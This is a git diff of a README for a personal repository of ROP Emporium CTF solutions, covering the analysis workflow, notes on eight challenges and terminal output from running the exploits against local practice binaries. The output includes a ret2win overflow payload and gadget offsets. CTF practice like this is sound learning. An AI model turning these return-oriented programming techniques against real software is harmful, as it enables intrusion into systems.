@@ -1,54 +1,184 @@
 # ROP Emporium
-This repository contains my solutions to the ROP Emporium CTF Series, specifically the x86-64 challenges. ROP Emporium is a Capture the Flag (CTF) style challenge that focuses on exploiting buffer overflows with Return-Oriented Programming (ROP) and other low-level techniques. These challenges allow you to sharpen your binary exploitation, debugging, and reverse engineering skills. 
 
-There are plenty of guides that already exist for these challenges, I am instead going to focus on the things that gave me difficulty and my general process for solving this CTF series. 
+This repository contains my solutions to the ROP Emporium CTF series, focusing on the x86-64 challenges. ROP Emporium is a Capture the Flag (CTF) challenge series that revolves around exploiting buffer overflows using Return-Oriented Programming (ROP) and other binary exploitation techniques. These challenges helped me sharpen my skills in debugging, reverse engineering, and exploit development.
 
-# Files Inlcuded
+# Files Included
 
-exploit.py - My solution to the challenges, this singular script has all 8 solutions implemented.
+* exploit.py: Contains my solutions to all 8 challenges in one script.
+* bytefinder.py: A scratch file used for testing file loading/searching, specifically used in the "pivot" challenge.
+* expcallme.py: A separate solution to the "callme" challenge. It's functionally the same as my solution but written to address an issue I encountered with a filename collision in the "encrypted_flag.dat" file.
+* exploitOutput.txt: output from terminal of the script running. Also shown at the end of this readme.
 
-bytefinder.py - This is a scratch file to test some file loading/searching, I used this for pivot.
-
-expcallme.py - This is a separate callme solution (Functionally the same as my solution) I specifically wrote this because of an interaction I found on rerun of my entire solution. 2 challenges use the same name for different files. Because of this collision my callme solution fails in my script. 
-
-The rest of the files included are the ropemporium files. You could clone this and run the exploit script if you wanted. Callme will fail to decode the encrypted dat file. 
-
+The remaining files are the ROP Emporium challenge files. You can clone the repository and run the exploit script, but note that the "callme" challenge will fail to decode the encrypted dat file due to this collision.
 
 # General Approach
-I started each challenge with static analysis utiizing readelf, objdump, and eventually ropper to begin. Sometimes I would run an ltrace or strace but quickly opted to just dynamically analyze files in gdb.
-* First I would run the binary normally
-* Second I would run the binary and test the overflow
-* After the initial introduction to the binary, I would use readelf, objdump, and ropper each in their own tab of my CLI to perform static analysis. Sometimes the challenges contain a "useful" function with specific rop gadgets. For the challenges that had this avenue available, I analyzed the gadgets and tried to figure out the "intended" solution. Almost all of the "useful" function rop gadgets available lead to a very obvious intended solution route.
 
-After intial analysis, I would start to craft my exploit in parallel with dynamic analysis using gdb-gef. For example I might craft a simple return or call to test parameters and behavior. I would also use gdb to find more information about the binary if needed. Commonly I had to go and examine or dump the Procedure Linkage Table (PLT) and Global Offset Table (GOT) in order to find crucial information needed for my rop-chain to function correctly. 
+For each challenge, I began with static analysis using tools like readelf, objdump, and ropper. I would also use ltrace or strace to gather initial information, though I often switched to dynamic analysis in GDB for more in-depth debugging.
 
-After this, I would finish the rop chain and test the completion of the challenge for the flag return. Sometimes I would have to go and debug or change small pieces of my solution in order to consistently solve the challenge. A few times I would get about 80-90% of the challenge done and get stuck and have to reseach more about how the stack functions, how certain assembly instructions work, or specific issues I was encountering. 
+My general workflow for solving each challenge was as follows:
+1. Run the binary normally to understand its basic functionality.
+2. Test the overflow.
+3. Perform static analysis using readelf, objdump, and ropper in parallel to find useful ROP gadgets and functions.
+4. Craft the exploit using gdb-gef to dynamically test and debug the solution.
+5. Debug and refine the exploit, often focusing on the Stack as well as the Procedure Linkage Table (PLT) and Global Offset Table (GOT) for resolving function addresses.
 
-I specifically coded all of these challenges in one script instead of individual solutions to test some various features of pwntools. These tests are not shown on the final solution. 
+I specifically chose to code all solutions in one script to experiment with features of pwntools—these experimental tests are not included in the final solution.
 
-# Challenge Specific Commentary
+# Challenge-Specific Commentary
 
-Challenge 1: ret2win 
-* This challenge introduces stack overwriting, overwrite the stack base pointer with the address of ret2win() and enjoy. I spent most of my time here introducing myself to pwntools python library and automating some testing. The only difficulty faced was understanding stack alignment and the movaps issue.
+* Challenge 1: ret2win: This challenge introduces stack overwriting. The solution involved overwriting the stack base pointer with the address of `ret2win()` to redirect execution. The most difficult part was understanding stack alignment and the `movaps` issue. This was also my first time working with the `pwntools` library and automating tests.
 
-Challenge 2: split
-* This challenge actually required a real rop chain and not just a return. This was straightforward, but required some work with ropper instead of just objdump. This was my introduction to ropper.
+* Challenge 2: split: This challenge required constructing a ROP chain, not just a simple return. I used `ropper` for the first time, which allowed me to find useful gadgets and build the chain. The challenge was fairly straightforward once I got familiar with the tools.
 
-Challenge 3: callme
-* While writing this writeup and rerunning my solutions I found a curious fact; callme shares a filename with ret2csu (the 8th challenge) called "encrypted_flag.dat" these files are different and you can only have 1 "active" at a time. My script that attempts to solve all 8 files will not return the flag of the other challenge. To get around this I could import zipfile and unzip the archives before I run each to ensure smooth operation, but given the scope of this project I've opted to just attach visual proof of callme running and call it a day.
-* This challenge was what pushed me to grab GDB Enhanced Features (GDB-GEF) for stronger debugging features as well as the GUI. A lot of time was saved seeing the output of all the registers and stack immediately after after instruction step instead of having to manually examine each register, the stack, etc. I **HIGHLY** recommend it. 
+* Challenge 3: callme:  This challenge was what pushed me to grab GDB Enhanced Features `GDB-GEF` for stronger debugging features as well as the GUI. A lot of time was saved seeing the output of all the registers and stack immediately after after instruction step instead of having to manually examine each register, the stack, etc. I *HIGHLY* recommend it. While writing this writeup and rerunning my solutions I found a curious fact; callme shares a filename with ret2csu (the 8th challenge) called `encrypted_flag.dat` these files are different and you can only have 1 "active" at a time. My script that attempts to solve all 8 challenges will not return the flag of the other challenge. To get around this I could `import zipfile` and unzip the archives before I run each to ensure smooth operation, but this was determined to be out of scope. I have other projects that need to be completed and I would rather move on.
 
-Challenge 4: write4 - 
-* Oh so this is one of the ways you can arbitraily write to memory, neat. I had a lot of fun with this one. Some trial in error on deciding where to write to. 
+* Challenge 4: write4: This challenge taught me a new technique for arbitrary memory writes, which was interesting and fun to explore. There was some trial and error in determining where exactly to write to.
 
-Challenge 5: badchars - 
-* Lots of trial and error and a little of research to refresh myself on binary operations. I knew the route to take for the solution but actually sitting down and getting there was tedious.
+* Challenge 5: badchars: This challenge involved a lot of trial and error, as well as refreshing my knowledge on binary operations. While I knew the general approach for solving it, getting there took a considerable amount of time and a few pieces of paper. 
 
-Challenge 6: fluff - 
-* This challenge gave me the most trouble. I had a good idea of how the 3 assembly instructions worked to create the write function, but actually understanding them so I could utilize them in my rop chain took me over a day of research as well as a large amount of trial and error.
+* Challenge 6: fluff: This challenge gave me the most trouble. I had a good understanding of how the three assembly instructions worked to create the write function, but understanding them well enough to use them in my ROP chain took over a day of research and a lot of trial and error.
 
-Challenge 7: pivot - 
-* The answer was not just throwing the new stack location on the stack (why did I even think that would work?) It was setting the stack pointer to the new location. Also had some fun trying to read that location from the terminal in various ways to be able to grab it and add it to the ropchain. 
+* Challenge 7: pivot: The solution wasn't as simple as just throwing the new stack location onto the stack. The key was setting the stack pointer to the new location. I also spent some time trying different ways to read the location from the terminal in order to grab it and include it in the ROP chain. The file `bytefinder.py` is the scratch file I used to look at loading and searching a file.
 
-Challenge 8: ret2csu -
-* I watched the blackhat talk 2-3 times while learning how this works. Shares a filename with callme that can break this challenge if you have the wrong one unzipped. I found this one to be fairly straightforward and easy after reading the paper. 
+* Challenge 8: ret2csu: After watching the related Black Hat talk 2-3 times, I found this challenge to be fairly straightforward. It shares a filename with callme that can break this challenge if you have the wrong one unzipped. I found this one to be fairly straightforward and easy after reading the paper.
+
+# Solution Output
+
+Notice the flag from `callme` doesn't return. Also notice that callme is still being run as `gdb.debug("./callme")` instead of `process("./callme")` because I forgot to swap it back after hunting down that source of the faliure? 
+```
+[x] Starting local process './ret2win'
+[+] Starting local process './ret2win': pid 5024
+Payload in hex: 4141414141414141414141414141414141414141414141414141414141414141414141414141414170074000000000005607400000000000
+Payload in ASCII: b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp\x07@\x00\x00\x00\x00\x00V\x07@\x00\x00\x00\x00\x00'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[x] Receiving all data: 296B
+[x] Receiving all data: 329B
+[+] Receiving all data: Done (329B)
+[*] Process './ret2win' stopped with exit code 0 (pid 5024)
+ret2win by ROP Emporium
+x86_64
+
+For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
+What could possibly go wrong?
+You there, may I have your input please? And don't worry about null bytes, we're using read()!
+
+> Thank you!
+Well done! Here's your flag:
+ROPE{a_placeholder_32byte_flag!}
+
+[x] Starting local process './split'
+[+] Starting local process './split': pid 5027
+[x] Receiving all data
+[x] Receiving all data: 0B
+[x] Receiving all data: 87B
+[x] Receiving all data: 120B
+[+] Receiving all data: Done (120B)
+[*] Stopped process './split' (pid 5027)
+split by ROP Emporium
+x86_64
+
+Contriving a reason to ask user for data...
+> Thank you!
+ROPE{a_placeholder_32byte_flag!}
+
+[x] Starting local process '/usr/bin/gdbserver'
+[+] Starting local process '/usr/bin/gdbserver': pid 5030
+[*] running in new terminal: ['/usr/bin/gdb', '-q', './callme', '-x', '/tmp/pwnlib-gdbscript-m1vphqyz.gdb']
+[x] Receiving all data
+[x] Receiving all data: 0B
+[x] Receiving all data: 79B
+[x] Receiving all data: 171B
+[+] Receiving all data: Done (171B)
+[*] Process '/usr/bin/gdbserver' stopped with exit code 0 (pid 5033)
+b'callme by ROP Emporium\nx86_64\n\nHope you read the instructions...\n\n> Thank you!\ncallme_one() called correctly\ncallme_two() called correctly\nAi\xca\n\nChild exited with status 0\n'
+[x] Starting local process './write4'
+[+] Starting local process './write4': pid 5073
+[x] Receiving all data
+[x] Receiving all data: 0B
+[x] Receiving all data: 118B
+[+] Receiving all data: Done (118B)
+[*] Stopped process './write4' (pid 5073)
+write4 by ROP Emporium
+x86_64
+
+Go ahead and give me the input already!
+
+> Thank you!
+ROPE{a_placeholder_32byte_flag!}
+
+[x] Starting local process './badchars'
+[+] Starting local process './badchars': pid 5074
+dnce,vzv
+[x] Receiving all data
+[x] Receiving all data: 0B
+[x] Receiving all data: 112B
+[+] Receiving all data: Done (112B)
+[*] Stopped process './badchars' (pid 5074)
+badchars by ROP Emporium
+x86_64
+
+badchars are: 'x', 'g', 'a', '.'
+> Thank you!
+ROPE{a_placeholder_32byte_flag!}
+
+[x] Starting local process './fluff'
+[+] Starting local process './fluff': pid 5075
+f -> Offset:0x3c4 || Actual -> 0x4003c4
+l -> Offset:0x239 || Actual -> 0x400239
+a -> Offset:0x3d6 || Actual -> 0x4003d6
+g -> Offset:0x3cf || Actual -> 0x4003cf
+. -> Offset:0x24e || Actual -> 0x40024e
+t -> Offset:0x192 || Actual -> 0x400192
+x -> Offset:0x246 || Actual -> 0x400246
+t -> Offset:0x192 || Actual -> 0x400192
+['0x4003c4', '0x400239', '0x4003d6', '0x4003cf', '0x40024e', '0x400192', '0x400246', '0x400192']
+[x] Receiving all data
+[x] Receiving all data: 0B
+[x] Receiving all data: 148B
+[+] Receiving all data: Done (148B)
+[*] Stopped process './fluff' (pid 5075)
+fluff by ROP Emporium
+x86_64
+
+You know changing these strings means I have to rewrite my solutions...
+> Thank you!
+ROPE{a_placeholder_32byte_flag!}
+
+[x] Starting local process './pivot'
+[+] Starting local process './pivot': pid 5076
+pivot by ROP Emporium
+x86_64
+
+Call ret2win() from libpivot
+The Old Gods kindly bestow upon you a place to pivot: 0x7f6c90dfff10
+Send a ROP chain now and it will land there
+> 
+Heap address found: 0x7f6c90dfff10
+[x] Receiving all data
+[x] Receiving all data: 47B
+[*] Process './pivot' stopped with exit code 0 (pid 5076)
+[x] Receiving all data: 173B
+[+] Receiving all data: Done (173B)
+Thank you!
+
+Now please send your stack smash
+> Thank you!
+foothold_function(): Check out my .got.plt entry to gain a foothold into libpivot
+ROPE{a_placeholder_32byte_flag!}
+
+[x] Starting local process './ret2csu'
+[+] Starting local process './ret2csu': pid 5077
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './ret2csu' stopped with exit code 0 (pid 5077)
+[x] Receiving all data: 184B
+[+] Receiving all data: Done (184B)
+ret2csu by ROP Emporium
+x86_64
+
+Check out https://ropemporium.com/challenge/ret2csu.html for information on how to solve this challenge.
+
+> Thank you!
+ROPE{a_placeholder_32byte_flag!}
+```
